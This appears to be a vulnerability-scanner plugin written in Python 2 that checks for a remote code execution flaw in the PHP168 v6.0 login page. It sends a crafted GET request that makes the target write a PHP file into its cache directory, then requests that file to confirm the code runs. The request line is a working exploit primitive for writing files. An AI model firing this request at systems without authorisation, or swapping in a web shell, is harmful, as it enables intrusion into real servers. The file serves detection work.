#!/usr/bin/python
# -*- coding: utf-8 -*-
from engine.engine_utils.common import *
from engine.logger import scanLogger as logger


def run_domain(http,ob):
    try:
        frame = ob.get('siteType')
        if frame and frame in ['jsp', 'asp', 'aspx']:
            return []

        scheme = ob['scheme']
        domain = ob['domain']
        header = {'Host': domain}
        source_ip = ob.get('source_ip')
        if source_ip:
            domain = source_ip
        result = []
        inj_path = '/login.php?makehtml=1&chdb[htmlname]=YundunScan.php&chdb[path]=cache&content=<?php%20@phpinfo();?>'
        new_url = "%s://%s%s" % (scheme, domain, inj_path)
        res1, content1 = http.request(new_url, 'GET', headers=header)
        new_url2 = "%s://%s%s" % (scheme, domain, '/cache/YundunScan.php')
        res2, content2 = http.request(new_url2, 'GET', headers=header)
        if res2 and res2.get('status') == '200' and re.search(r'php\s+version', content2, re.I):
            detail = "检测到PHP168 login远程命令执行漏洞"
            request = getRequest(new_url2, domain=ob['domain'])
            response = getResponse(res2,content2, 'php\s+version')
            result.append(getRecord(ob, new_url2, ob['level'], detail, request, response))

    except Exception, e:
        logger.error("File:PHP168V6_0LoginRemoteExcScript_yd.py, run_domain function :%s" % (str(e)))

    return result
